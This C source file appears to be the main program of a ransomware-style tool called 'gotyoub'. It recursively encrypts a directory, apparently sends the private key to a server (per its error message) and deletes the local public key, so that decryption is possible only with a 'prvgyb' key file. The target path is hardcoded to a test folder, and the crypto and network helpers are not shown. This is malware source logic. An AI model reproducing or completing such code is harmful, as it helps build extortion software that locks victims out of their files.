#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "recursive.h"
#include "rsa.h"

//return if prv exists
int decrypt(char* path){
  if(!exists("prvgyb"))
    return 1;
  rec(path, &decrypt_file);
  return 0;
}

//return if prv exists
void encrypt(char* path){
  rec(path, &encrypt_file);
  remove("pubgyb");
}

int main(int argc, char* argv[]){
  int dec=0;
  if (argc==1){
    printf("Encrypring mode enabled.\n");
  } else if (argc==2 && (!strcmp(argv[1], "-d") || !strcmp(argv[1], "--decrypt"))){
    printf("Decrypring mode enabled.\n");
    dec=1;
  } else {
    printf("Usage:\ngotyoub                :recursively encrypts a directory\ngotyoub [-d|--decrypt] :recursively decrypts a directory\n");
    exit(0);
  }/*
  printf("Please enter the path to the direcrory:\ngyb!>");
  char path[100]="NULL";
  scanf("%s", path);
  
  while(path[0]!='/' || !exists(path) || is_regular_file(path)){
    printf("Only valid absolute path to directories are allowed.\ngyb!>");
    scanf("%s", path);
  }*/
  char* path="/home/eliot/Bureau/gotyoub/good";
  if (dec){
    if(decrypt(path)){
      printf("prvgyb file missing to decrypt.\n");
      return 1;
    }
    return 0;
  } else {
    if(gen_keys()){
      printf("Error occured while sending private key to server.\n");
      return 1;
    } else {
      printf("Ok.\n");
      encrypt(path);
    }
    return 0;
  }
}
